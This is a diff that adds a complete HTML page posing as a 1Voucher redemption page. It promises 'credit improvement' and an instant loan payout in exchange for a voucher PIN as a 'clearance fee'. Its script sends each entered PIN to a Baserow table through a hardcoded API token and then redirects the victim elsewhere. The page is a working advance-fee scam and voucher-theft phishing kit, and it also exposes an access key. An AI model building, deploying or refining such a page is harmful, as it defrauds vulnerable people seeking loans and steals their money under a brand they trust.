@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redeem 1Voucher</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    .container {
+      background-color: white;
+      width: 100%;
+      max-width: 400px;
+      padding: 25px 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+    .voucher-select {
+      font-weight: bold;
+      font-size: 16px;
+    }
+    .voucher-logo img {
+      height: 24px;
+    }
+    h3 {
+      font-size: 15px;
+      margin: 20px 0 10px 0;
+      color: #333;
+    }
+    .notice {
+      font-size: 14px;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 15px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      letter-spacing: 2px;
+      box-sizing: border-box;
+    }
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 20px;
+    }
+    .btn {
+      padding: 10px 20px;
+      font-weight: bold;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .back {
+      background-color: #222;
+      color: white;
+    }
+    .redeem {
+      background-color: #ccc;
+      color: white;
+      cursor: not-allowed;
+    }
+    .redeem.active {
+      background-color: #007bff;
+      cursor: pointer;
+    }
+    .redeem:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
+    .error {
+      color: #ff0000;
+      font-size: 14px;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+    .instructions {
+      font-size: 11px;
+      color: #444;
+      margin-top: 25px;
+      line-height: 1.6;
+    }
+    .selfpay {
+      font-size: 13px;
+      margin-top: 25px;
+      font-weight: bold;
+      background-color: #f2f2f2;
+      padding: 10px;
+      border-left: 4px solid #007bff;
+      border-radius: 5px;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="voucher-select">1 Voucher</div>
+      <div class="voucher-logo">
+        <img src="https://1voucher.imgix.net/brand/logo/logo-orange.svg" alt="1Voucher Logo">
+      </div>
+    </div>
+    <div class="notice">
+      Redeem your voucher and then enter your ID number and click <strong>"Improve My Credit"</strong> to get your loan released instantly.
+    </div>
+    <input type="text" id="voucherInput" placeholder="XXXX XXXX XXXX XXXX">
+    <div id="errorMessage" class="error" style="display: none;"></div>
+    <div class="buttons">
+      <button class="btn back" onclick="goBack()">BACK</button>
+      <button class="btn redeem" id="redeemBtn" onclick="redeemVoucher()" disabled>REDEEM</button>
+    </div>
+    <div class="selfpay">
+      ⚙️ How to Pay the R50 Clearance Fee (Self-Service):<br><br>
+      • Click on any <strong>Credit Score Improvement</strong> method<br>
+      • Choose your <strong>voucher type</strong><br>
+      • Enter your <strong>voucher PIN</strong> (from the till slip or app)<br>
+      • The system will <strong>clear your record</strong> and trigger your loan payout
+    </div>
+    <div class="instructions">
+      <strong>ℹ️ You can buy a 1Voucher using airtime by following a few simple steps, either online or at participating retailers:</strong><br><br>
+      <strong>1.</strong> <b>Find a Retailer:</b> Locate a retailer that sells 1Vouchers. You can purchase them from stores like Flash, PEP, or Shoprite, or buy directly online from the 1Voucher website.<br>
+      <strong>2.</strong> <b>Choose the Voucher Amount:</b> Pick the amount that suits your needs. 1Vouchers are available in different values, for use in shopping, gaming, or online services.<br>
+      <strong>3.</strong> <b>Pay Using Airtime:</b> Online purchases allow you to pay with mobile airtime. For in-store, use cash or airtime (if accepted by the store).<br>
+      <strong>4.</strong> <b>Receive Your Voucher:</b> After payment, you'll get a 16-digit PIN. This code is used to redeem the voucher for services or products.
+    </div>
+  </div>
+
+  <script>
+    // Baserow API Configuration
+    const BASEROW_API_URL = 'https://api.baserow.io/api/database/rows/table/558162/';
+    const BASEROW_API_KEY = 'qVXtv5uzHaSzMLbLRE7rITJHlc4G6WN2';
+
+    const voucherInput = document.getElementById('voucherInput');
+    const redeemBtn = document.getElementById('redeemBtn');
+    const errorMessage = document.getElementById('errorMessage');
+
+    // Enable/disable redeem button based on input
+    voucherInput.addEventListener('input', function() {
+      const value = this.value.trim();
+      if (value.length > 0) {
+        redeemBtn.disabled = false;
+        redeemBtn.classList.add('active');
+      } else {
+        redeemBtn.disabled = true;
+        redeemBtn.classList.remove('active');
+      }
+      // Hide error message when user types
+      hideError();
+    });
+
+    function showError(message) {
+      errorMessage.textContent = message;
+      errorMessage.style.display = 'block';
+    }
+
+    function hideError() {
+      errorMessage.style.display = 'none';
+    }
+
+    function goBack() {
+      window.history.back();
+    }
+
+    async function redeemVoucher() {
+      const voucherCode = voucherInput.value.trim();
+      
+      // Validate voucher code length
+      if (voucherCode.length < 16) {
+        showError('Invalid code - must be at least 16 characters');
+        return;
+      }
+
+      // Disable button and show loading state
+      redeemBtn.disabled = true;
+      redeemBtn.textContent = 'REDEEMING...';
+      hideError();
+
+      try {
+        // Send voucher data to Baserow
+        const response = await fetch(BASEROW_API_URL, {
+          method: 'POST',
+          headers: {
+            'Authorization': `Token ${BASEROW_API_KEY}`,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            PhoneNumber: voucherCode,
+            Timestamp: new Date().toISOString(),
+            Status: 'Redeemed'
+          })
+        });
+
+        if (response.ok) {
+          // Successful submission - redirect to dfdt.com
+          window.location.href = 'https://dfdt.com';
+        } else {
+          throw new Error('Failed to submit voucher');
+        }
+      } catch (error) {
+        showError('Failed to redeem voucher. Please try again.');
+        console.error('Error submitting voucher:', error);
+        
+        // Re-enable button
+        redeemBtn.disabled = false;
+        redeemBtn.classList.add('active');
+        redeemBtn.textContent = 'REDEEM';
+      }
+    }
+  </script>
+</body>
+</html>
